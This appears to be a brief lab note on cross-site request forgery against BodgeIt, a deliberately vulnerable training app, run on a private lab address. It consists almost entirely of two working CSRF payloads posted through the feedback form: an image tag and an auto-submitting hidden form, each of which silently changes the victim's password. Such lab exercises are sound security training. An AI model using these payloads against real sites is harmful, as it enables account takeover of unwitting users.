# A8 - Cross-Site Request Forgery (CSRF)

BodgeIt : leave feedback

`<img src='http://10.6.6.13:8080/bodgeit/password.jsp?password1=heslo&password2=heslo'>`


```
<form action="http://10.6.6.13:8080/bodgeit/password.jsp" method="POST">
  <input type="hidden" name="password1" value="heslo" />
  <input type="hidden" name="password2" value="heslo" />
  <input type="submit" value="Submit request" />
</form>
<script>document.forms[0].submit();</script>

```
